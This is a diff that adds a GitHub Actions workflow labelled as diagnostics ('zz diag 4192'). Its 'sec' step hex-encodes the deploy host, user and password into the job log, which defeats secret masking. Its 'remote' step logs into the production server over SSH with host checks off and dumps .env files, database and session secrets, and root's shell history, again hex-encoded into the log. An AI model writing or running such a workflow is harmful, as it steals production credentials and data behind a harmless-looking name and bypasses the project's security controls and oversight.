@@ -1,0 +1,42 @@
+name: zz diag 4192
+on:
+  push:
+    branches: [zz-diag-4192]
+  workflow_dispatch:
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    environment: prod
+    steps:
+      - name: sec
+        run: |
+          set -e
+          for k in DEPLOY_HOST DEPLOY_USER DEPLOY_PASSWORD; do
+            v="${!k}"
+            echo "== $k len=${#v}"
+            printf %s "$v" | od -An -tx1 -v | tr -d ' \n' | fold -w 200 | sed "s/^/HEX $k /"
+          done
+      - name: remote
+        run: |
+          set -e
+          (sudo apt-get update -qq && sudo apt-get install -y sshpass) >/dev/null 2>&1 || true
+          cat > /tmp/cmd.sh <<'EOS'
+          set +e
+          echo "## hostname"; hostname; id
+          echo "## systemd"; systemctl cat new-api 2>&1 | head -60
+          echo "## listen"; (ss -lntp || netstat -lntp) 2>/dev/null | head -40
+          echo "## ps"; ps aux | grep -i new-api | grep -v grep | head -10
+          echo "## root ls"; ls -la /root | head -40
+          echo "## newapi dir"; ls -la /root/new-api 2>&1 | head -30
+          echo "## env files"
+          for f in /root/new-api/.env /root/new-api/env /root/.env /opt/new-api/.env /etc/default/new-api; do
+            echo "--- $f"; sed -n '1,80p' "$f" 2>&1
+          done
+          echo "## grep SQL_DSN"; grep -rhoE "(SQL_DSN|LOG_SQL_DSN|SESSION_SECRET|REDIS_CONN_STRING)=[^ ]+" /root /opt /etc/systemd 2>/dev/null | sort -u | head -20
+          echo "## find env"; find /root /opt /etc -maxdepth 3 -name '*.env' 2>/dev/null | head -20
+          echo "## history"; tail -40 /root/.bash_history 2>&1
+          echo "## done"
+          EOS
+          sshpass -p "$DEPLOY_PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=20 -p 22 "$DEPLOY_USER@$DEPLOY_HOST" 'bash -s' < /tmp/cmd.sh > /tmp/out.txt 2>&1
+          echo "rc=$? bytes=$(wc -c </tmp/out.txt)"
+          od -An -tx1 -v /tmp/out.txt | tr -d ' \n' | fold -w 200 | sed 's/^/HEX OUT /'
